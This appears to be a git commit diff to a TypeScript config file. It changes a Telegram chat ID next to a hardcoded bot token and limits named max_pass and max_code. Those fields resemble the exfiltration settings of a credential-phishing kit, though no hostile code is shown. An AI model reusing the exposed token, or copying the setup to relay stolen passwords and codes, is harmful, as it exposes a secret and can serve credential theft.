afe423122b484ec545b20191ac46a1cb5d224f93
anan3122 <lychian1121@gmail.com>
2025-11-14 13:37:15 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -2,6 +2,6 @@ const config = {
     max_pass: 1,
     max_code: 3,
     token: '8555411664:AAGPHR7hXC4Q8iv1Rn9c8r_FKkYYuprb_70',
-    chat_id: '-4835915740'
+    chat_id: '5498478230'
 };
 export default config;
